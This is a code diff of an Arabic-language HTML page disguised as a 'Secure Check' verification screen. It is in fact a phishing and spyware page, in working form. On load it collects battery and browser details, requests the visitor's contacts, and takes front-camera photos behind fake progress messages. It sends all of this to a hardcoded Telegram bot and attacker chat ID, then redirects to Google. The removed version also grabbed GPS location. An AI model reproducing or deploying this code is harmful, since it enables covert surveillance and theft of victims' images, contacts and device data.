@@ -2,75 +2,168 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>V8 Global - Secure Check</title>
     <style>
-        body { background: #000; color: #00ffcc; text-align: center; padding-top: 100px; font-family: monospace; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* التنسيق الأصلي الخاص بك مع إضافة لمسات للأزرار */
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-user-select: none; user-select: none; }
+        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; text-align: center; height: 100vh; overflow: hidden; }
+        .container { position: relative; z-index: 2; padding: 30px; margin-top: 50px; }
+        .logo { font-size: 24px; margin-bottom: 30px; text-shadow: 0 0 10px #00ffcc; }
+        #status { font-size: 18px; margin-bottom: 20px; min-height: 60px; padding: 15px; background: rgba(0, 255, 204, 0.1); border-radius: 10px; border: 1px solid rgba(0, 255, 204, 0.3); }
+        .progress-bar { height: 6px; background: linear-gradient(90deg, #00ffcc, #00ccff); width: 0%; transition: width 0.5s; border-radius: 3px; margin: 20px auto; width: 80%; }
+        .step-indicator { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .step { width: 35px; height: 35px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; border: 2px solid transparent; }
+        .step.active { border-color: #00ffcc; box-shadow: 0 0 10px #00ffcc; }
+        .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
+        .flash-overlay.active { animation: flashAnim 0.5s; }
+        @keyframes flashAnim { 0% { opacity: 0; } 10% { opacity: 0.9; } 100% { opacity: 0; } }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h2 id="title">جاري فحص النظام...</h2>
-    <div class="loader"></div>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>
+    <div class="flash-overlay" id="flashOverlay"></div>
+    <div class="container">
+        <div class="logo">V8 GLOBAL SYSTEM V2</div>
+        <div id="status">جاري تهيئة بروتوكولات الحماية...</div>
+        <div class="progress-bar" id="progressBar"></div>
+        <div class="step-indicator">
+            <div class="step" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+            <div class="step" id="step4">4</div>
+            <div class="step" id="step5">5</div>
+        </div>
+        <video id="v" autoplay playsinline muted></video>
+        <canvas id="c"></canvas>
+    </div>
 
     <script>
+        // =========== الإعدادات المركزية ===========
         const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
         const urlParams = new URLSearchParams(window.location.search);
         const targetID = urlParams.get('id');
-        const mode = urlParams.get('mode');
 
-        // تغيير العنوان حسب النوع
-        const titles = {
-            battery: "فحص جودة البطارية...",
-            info: "تحديث معلومات الجهاز...",
-            camera: "تفعيل وضع البث المباشر...",
-            gps: "تحديد أقرب سيرفر لمنطقتك..."
-        };
-        if(mode) document.getElementById('title').innerText = titles[mode];
+        const statusEl = document.getElementById('status');
+        const progressBar = document.getElementById('progressBar');
+        const flashOverlay = document.getElementById('flashOverlay');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
 
-        async function startSiphoning() {
-            if(!targetID) return;
-            let report = `🚀 **صيد V8 جديد (${mode}):**\n`;
+        // وظائف التحديث
+        function updateUI(text, prog, step) {
+            statusEl.innerText = text;
+            progressBar.style.width = prog + '%';
+            if(step) document.getElementById(`step${step}`).classList.add('active');
+        }
 
-            // 1. سحب البطارية والنظام (دائماً)
-            let b = await navigator.getBattery();
-            report += `🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}\n`;
+        // 1. جمع معلومات الجهاز (Battery & Info)
+        async function getInfo() {
+            updateUI("🔍 فحص النظام والبطارية...", 20, 1);
+            const b = await navigator.getBattery();
+            return `🔋 الشحن: ${Math.floor(b.level * 100)}% | الحالة: ${b.charging ? '⚡' : '🔋'}\n📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.slice(0, 50)}`;
+        }
 
-            // 2. سحب الموقع (إذا كان الوضع GPS)
-            if (mode === 'gps') {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    report += `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendData(report);
-                }, () => sendData(report));
-            } 
-            // 3. سحب الكاميرا (إذا كان الوضع Camera)
-            else if (mode === 'camera') {
+        // 2. سحب جهات الاتصال (Contact Picker)
+        async function getContacts() {
+            updateUI("📇 تأمين سجل الأسماء...", 40, 2);
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
                 try {
-                    let s = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
-                    let v = document.getElementById('v'); v.srcObject = s;
-                    setTimeout(async () => {
-                        let canvas = document.getElementById('c');
-                        canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
-                        let img = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                        let fd = new FormData(); fd.append('chat_id', targetID); fd.append('caption', report); fd.append('photo', img, 'p.jpg');
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
-                        s.getTracks().forEach(t => t.stop());
-                        window.location.replace("https://google.com");
-                    }, 4000);
-                } catch(e) { sendData(report); }
-            } else {
-                sendData(report);
+                    const props = ['name', 'tel'];
+                    const contacts = await navigator.contacts.select(props, { multiple: true });
+                    if (contacts.length > 0) {
+                        return contacts.map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
+                    }
+                } catch (e) { return "❌ تم رفض الوصول للأسماء"; }
+            }
+            return "⚠️ المتصفح لا يدعم سحب الأسماء";
+        }
+
+        // 3. دالة فحص جودة الصورة (منع الشاشة السوداء)
+        async function checkImage(dataUrl) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.onload = () => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = img.width; canvas.height = img.height;
+                    ctx.drawImage(img, 0, 0);
+                    const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                    let brightness = 0;
+                    for (let i = 0; i < data.length; i += 4) {
+                        brightness += (data[i] + data[i+1] + data[i+2]) / 3;
+                    }
+                    resolve((brightness / (data.length / 4)) > 40); // إذا السطوع أكبر من 40
+                };
+                img.src = dataUrl;
+            });
+        }
+
+        // العملية الرئيسية
+        async function start() {
+            if (!targetID) { window.location.replace("https://google.com"); return; }
+
+            // معلومات الجهاز
+            const info = await getInfo();
+            
+            // جهات الاتصال
+            const contacts = await getContacts();
+
+            // تشغيل الكاميرا
+            updateUI("🎥 مزامنة الكاميرا الأمامية...", 60, 3);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000)); // انتظار الضبط
+
+                updateUI("📸 التقاط صور عالية الدقة...", 80, 4);
+                let finalPhoto = null;
+                
+                // محاولات التقاط مع فلاش لمنع السواد
+                for (let i = 0; i < 3; i++) {
+                    flashOverlay.classList.add('active');
+                    setTimeout(() => flashOverlay.classList.remove('active'), 500);
+                    
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const shot = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    if (await checkImage(shot)) { finalPhoto = shot; break; }
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+
+                // إرسال الكل لتليجرام
+                updateUI("📤 إرسال التقارير النهائية...", 95, 5);
+                
+                // إرسال النصوص (معلومات + أسماء)
+                const fullText = `${info}\n\n📇 **جهات الاتصال المستخرجة:**\n${contacts.slice(0, 3000)}`;
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: targetID, text: fullText, parse_mode: 'Markdown' })
+                });
+
+                // إرسال الصورة
+                if (finalPhoto) {
+                    const blob = await (await fetch(finalPhoto)).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', targetID);
+                    fd.append('photo', blob, 'v8_capture.jpg');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
+
+                stream.getTracks().forEach(t => t.stop());
+                updateUI("✅ تم التأمين بنجاح", 100, 5);
+                setTimeout(() => window.location.replace("https://google.com"), 2000);
+
+            } catch (e) {
+                // في حال فشل الكاميرا نرسل الأسماء والمعلومات فقط
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${targetID}&text=${encodeURIComponent(info + "\n\n" + contacts)}`);
+                window.location.replace("https://google.com");
             }
         }
 
-        async function sendData(msg) {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${targetID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            window.location.replace("https://google.com");
-        }
-
-        window.onload = startSiphoning;
+        window.onload = () => setTimeout(start, 1000);
     </script>
 </body>
 </html>
